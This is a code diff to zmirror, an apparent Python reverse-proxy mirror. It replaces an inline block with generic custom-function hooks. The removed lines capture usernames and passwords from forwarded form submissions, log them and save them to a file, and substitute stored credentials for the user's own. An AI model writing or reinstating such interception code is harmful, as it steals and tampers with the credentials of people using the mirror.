@@ -17,11 +17,12 @@ from fnmatch import fnmatch
 from time import time, sleep, process_time
 from html import escape as html_escape
 from datetime import datetime, timedelta
-from urllib.parse import urljoin, urlsplit, urlunsplit, quote_plus,parse_qs,urlencode
+from urllib.parse import urljoin, urlsplit, urlunsplit, quote_plus
 import urllib.parse
 import requests
 from flask import Flask, request, make_response, Response, redirect
 from . import CONSTS
+
 
 try:
 	# for python 3.5+ Type Hint
@@ -2432,6 +2433,8 @@ def zmirror_enter(input_path='/'):
 		for name, cookie_string in parse.extra_cookies.items():
 			resp.headers.add("Set-Cookie", cookie_string)
 
+		if getattr(custom_func,'custom_our_response',None):
+			custom_func.custom_our_response(parse,resp)
 	except:  # coverage: exclude
 		return generate_error_page(is_traceback=True)
 	else:
@@ -2496,31 +2499,8 @@ def main_function(input_path='/'):
 	parse.request_data, parse.request_data_encoding = prepare_client_request_data()
 
 	#qgb 拦截 表单数据
-	if parse.request_data and 'username' in parse.request_data:
-		client_query=parse_qs(qs=parse.request_data,keep_blank_values=True)
-		if( 'username' in client_query):
-			if 'password' not in client_query:
-				U.log(client_query)
-			if 'password' in client_query:
-				username=client_query['username'][0]
-				password=client_query['password'][0]
-				if (username in sys.dup) and (sys.dup[username][0]==password):
-					client_query['password'][0]=sys.dup[username][2]
-					client_query['username'][0]=sys.dup[username][1]
-					parse.request_data=urlencode(query=client_query, doseq=True)
-					sys.dup[username].insert(3,U.stime())
-					F.dill_dump(obj=sys.dup,file=U.gst+'0731.mfyq.dup')
-				else:
-					if username in sys.dup:
-						sys.dup[username].insert(3,U.py.No(U.stime(),client_query) )
-					else:
-						sys.dup[username]=[password,username,password,U.py.No('first '+U.stime(),client_query) ]
-			# U.log(['=====',parse.request_data])
-
-		# parse.request_data=.replace('1234qwer','xxxxxxxxxxxx')
-		# parse.request_data=parse.request_data.replace('1234wxsb','1234qwer')
-
-
+	if getattr(custom_func,'custom_parse',None):
+		custom_func.custom_parse(parse)
 
 	# 请求真正的远程服务器
 	# 并在返回404/500时进行 domain_guess 尝试
@@ -2532,6 +2512,8 @@ def main_function(input_path='/'):
 
 	# 生成我们的响应
 	resp = generate_our_response()
+
+
 
 	# storge entire our server's response (headers included)
 	if local_cache_enable and parse.cacheable:
@@ -2590,6 +2572,7 @@ try:
 		# 所以在 unittest 中, 每次重载 zmirror 的时候, 都需要重载一次 custom_func
 		importlib.reload(importlib.import_module("custom_func"))
 	from custom_func import *
+	import custom_func
 except:  # coverage: exclude
 	pass
 
